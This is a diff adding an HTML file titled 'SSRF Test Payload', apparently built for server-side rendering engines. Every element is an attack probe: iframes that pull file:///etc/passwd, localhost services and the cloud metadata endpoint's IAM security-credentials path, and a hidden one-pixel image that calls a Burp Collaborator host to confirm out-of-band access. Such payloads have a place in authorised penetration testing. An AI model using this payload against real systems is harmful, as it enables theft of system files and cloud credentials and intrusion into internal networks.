@@ -1,0 +1,26 @@
+<html>
+<head>
+    <title>SSRF Test Payload</title>
+</head>
+<body>
+    <h1>Attempting Internal Probes...</h1>
+    
+    <p>Target: /etc/passwd (Local File)</p>
+    <iframe src="file:///etc/passwd" width="500" height="150" style="border: 2px solid red;"></iframe>
+    
+    <p>Target: 127.0.0.1:80 (Localhost)</p>
+    <iframe src="http://127.0.0.1/" width="500" height="150" style="border: 2px solid blue;"></iframe>
+    
+    <p>Target: Cloud Metadata</p>
+    <iframe src="http://169.254.169.254/latest/meta-data/" width="500" height="150" style="border: 2px solid green;"></iframe>
+    
+    <iframe src=”http://169.254.169.254/latest/meta-data/iam/security-credentials"></iframe>
+
+    <p>Target: Burp Collaborator (Check for HTTP/DNS hit)</p>
+    <img src="http://whoami.ua82180m6fuk0p2558vectwqlhr8fy3n.oastify.com/ssrf_check" width="1" height="1" style="visibility:hidden;position:absolute">
+
+    <p>Target: Localhost (Alternative Format)</p>
+    <iframe src="http://0.0.0.0:8080/" width="500" height="150" style="border: 2px solid orange;"></iframe>
+
+</body>
+</html>
